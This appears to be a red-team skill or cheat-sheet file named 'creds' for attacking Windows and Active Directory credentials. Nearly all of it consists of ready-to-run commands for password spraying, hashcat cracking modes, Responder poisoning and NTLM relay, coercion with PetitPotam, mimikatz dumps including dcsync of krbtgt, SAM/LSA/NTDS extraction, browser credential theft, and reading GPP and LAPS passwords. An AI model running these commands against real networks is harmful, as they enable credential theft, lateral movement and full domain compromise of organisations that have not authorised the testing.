---
name: creds
description: Password attacks, spraying, hashcat modes, Responder/relay, ticket extraction.
tags: [passwords, ntlm, hashcat, responder]
---
# Credentials

## Spray (lockout-safe)
- One password, all users, one attempt: `nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success`
- Know the policy first: `nxc smb $DC --pass-pol` (threshold + observation window).
- Order: `Company2026!`, `Season+Year`, `Welcome1`, username variants, `Password123`.
- `kerbrute passwordspray -d corp.local users.txt 'Pass'` — no lockout on invalid users, fast.

## Crack
- NTLM: `hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule`
- NetNTLMv2 `-m 5600`; Kerberoast `-m 13100`; AS-REP `-m 18200`; MSOL `-m 21300`.
- Fast: `-O -w 4`, `--loopback`, masks `?u?l?l?l?l?d?d?d?d`.
- `john --format=NT` when hashcat lacks a mode; `--rules=Jumbo`.

## Capture
- Responder: `responder -I eth0 -wrf` (WPAD, SMB, HTTP). Analyze only: `-A`.
- LLMNR/NBT-NS/mDNS poisoning gets NetNTLMv2 without touching the target.
- Relay: `ntlmrelayx.py -tf targets.txt -smb2support -socks`; `-i` for interactive.
  SMB signing off is the gate: `nxc smb $SUBNET --gen-relay-list relay.txt`.
- Coerce: `PetitPotam.py $LISTENER $TARGET`, `printerbug.py`, `dfscoerce.py`.

## From Windows
- `sekurlsa::logonpasswords`, `lsadump::sam`, `lsadump::dcsync /user:krbtgt` (mimikatz).
- `nxc smb $IP -u user -p pass --sam --lsa --ntds` (needs admin/DC).
- DPAPI: `dpapi::chrome`, `vault::list`; browser creds via `SharpChrome`.
- Cached domain creds: `cmdkey /list`, `runas /savecred`.

## Hidden knowledge
- The NTLM hash *is* the password for pass-the-hash; no cracking needed.
- `--local-auth` on every host: local admin reuse is the most common lateral path.
- Check `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` for AutoAdminLogon creds.
- GPP cpassword in SYSVOL: `gpp-decrypt`.
- LAPS: `nxc ldap $DC -u user -p pass --laps` (ms-Mcs-AdmPwd readable by groups).
- Hashcat `-m 1000` accepts `LM:NT`; strip the LM half if it is `aad3b435...`.
